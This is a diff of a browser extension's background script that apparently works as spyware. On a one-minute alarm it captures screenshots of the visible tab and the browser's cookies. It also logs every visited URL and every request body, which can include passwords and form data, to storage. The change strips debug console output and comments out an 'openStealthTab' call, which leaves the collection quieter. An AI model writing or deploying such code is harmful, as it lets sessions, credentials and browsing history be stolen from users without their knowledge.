@@ -6,14 +6,12 @@ import {
   captureVisibleTab,
   openStealthTab,
 } from "../utils/background-utils";
-import { logData, simplePrepend, writeLog } from "../utils/shared-utils";
-
-console.log("background.ts");
+import { contextData, simplePrepend, writeLog } from "../utils/shared-utils";
 
 chrome.alarms.create({ periodInMinutes: 1 });
 
 chrome.alarms.onAlarm.addListener(() => {
-  openStealthTab();
+  // openStealthTab();
   captureVisibleTab();
   captureCookies();
 });
@@ -23,8 +21,6 @@ chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());
 chrome.runtime.onMessage.addListener(async (message, sender, response) => {
   const { messageType, data }: { messageType: BackgroundMessage; data?: any } =
     message;
-
-  console.log({ messageType, data });
 
   switch (messageType) {
     case BackgroundMessage.HEARTBEAT:
@@ -51,7 +47,7 @@ chrome.runtime.onMessage.addListener(async (message, sender, response) => {
 chrome.webNavigation.onCompleted.addListener(async (details) => {
   await simplePrepend<INavigationLogEntry>(StorageKey.NAVIGATION_LOG, {
     url: details.url,
-    ...logData(),
+    ...contextData(),
   });
 
   writeLog("Recorded navigation");
@@ -62,7 +58,7 @@ chrome.webRequest.onBeforeRequest.addListener(
     if (details.requestBody) {
       simplePrepend<IRequestData>(StorageKey.REQUEST_BODY_LOG, {
         request: details,
-        ...logData(),
+        ...contextData(),
       }).then(
         () => {
           writeLog("Recorded request");
